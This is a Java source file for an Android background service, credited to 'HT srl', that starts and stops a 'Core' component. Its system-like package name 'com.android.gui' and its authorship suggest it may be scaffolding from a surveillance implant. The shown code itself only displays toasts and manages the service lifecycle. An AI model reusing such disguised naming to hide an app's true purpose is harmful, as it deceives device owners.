/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.gui;

import com.android.service.Core;
import com.android.service.Status;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

/**
 * The Class AndroidService.
 */
public class AndroidService extends Service {
	/** The Constant TAG. */
	private static final String TAG = "AndroidService";
	
	/** The core. */
	private Core core;

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(final Intent intent) {
		return null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		super.onCreate();

		Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();

		Status.setAppContext(getApplicationContext());
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();

		Toast.makeText(this, "Stopping thread", Toast.LENGTH_LONG).show();

		// Core stops
		core.Stop();
		core = null;

		Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onStart(android.content.Intent, int)
	 */
	@Override
	public void onStart(final Intent intent, final int startId) {
		super.onStart(intent, startId);

		Toast.makeText(this, "Service Started, starting thread",
				Toast.LENGTH_LONG).show();

		core = new Core();

		// Core starts
		core.Start(this.getResources(), getContentResolver());
	}
}
